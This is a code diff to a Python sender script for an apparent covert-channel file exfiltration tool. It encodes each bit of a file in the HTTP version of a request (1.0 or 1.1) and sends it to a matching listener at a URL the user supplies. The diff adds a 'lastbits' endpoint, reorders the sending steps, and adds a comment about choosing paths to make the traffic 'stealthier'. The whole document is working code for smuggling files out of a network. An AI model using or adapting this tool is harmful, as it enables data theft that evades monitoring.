@@ -4,8 +4,10 @@ import argparse
 import requests
 from http.client import HTTPConnection
 
-send_data_path = "/" # it is possible to use any path but it must be the same in listener.py and sender.py
-generate_file_path = "/newfile" # it is possible to use any path but it must be the same in listener.py and sender.py
+# It is possible to use any value for these 3 paths to make it stealthier but it must be the same in listener.py and sender.py
+send_data_path = "/bit"
+generate_file_path = "/newfile"
+last_bits_path = "/lastbits"
 
 def get_args():
 	parser = argparse.ArgumentParser()
@@ -15,10 +17,10 @@ def get_args():
 	return parser
 
 
-def send_bit(url, val_):
-	if val_ == "0":
+def send_bit(url, bit_val):
+	if bit_val == "0":
 		HTTPConnection._http_vsn_str = "HTTP/1.0"	
-	elif val_ == "1":
+	elif bit_val == "1":
 		HTTPConnection._http_vsn_str = "HTTP/1.1"	
 	else:
 		print("What an awful dream! Ones and zeros everywhere... and I thought I saw a 2!")
@@ -28,11 +30,11 @@ def send_bit(url, val_):
 
 def send_byte(url, byte):
 	binary_string = "{:08b}".format(int(byte.hex(),16))
-	for bit in binary_string:
-		send_bit(url, bit)
+	for bit_val in binary_string:
+		send_bit(url, bit_val)
 
 
-def send_file(url, file_, outputfile):
+def send_file(url, file_):
 	with open(file_, "rb") as f:
 		byte = f.read(1)
 		send_byte(url, byte)
@@ -43,8 +45,12 @@ def send_file(url, file_, outputfile):
 			send_byte(url, byte)
 
 
-def process_data(url, outputfile):
+def send_file_name(url, outputfile):
 	requests.get(url+generate_file_path+"?f="+outputfile)
+
+
+def send_last_bits(url):
+	requests.get(url+last_bits_path)
 
 
 def main():
@@ -54,9 +60,9 @@ def main():
 	outputfile = args.outputfile
 	if outputfile is None:
 		outputfile = os.path.basename(inputfile)
-	send_file(url, inputfile, outputfile)
-	process_data(url, outputfile)
-
+	send_file_name(url, outputfile)
+	send_file(url, inputfile)
+	send_last_bits(url)
 
 if __name__== "__main__":
 	main()
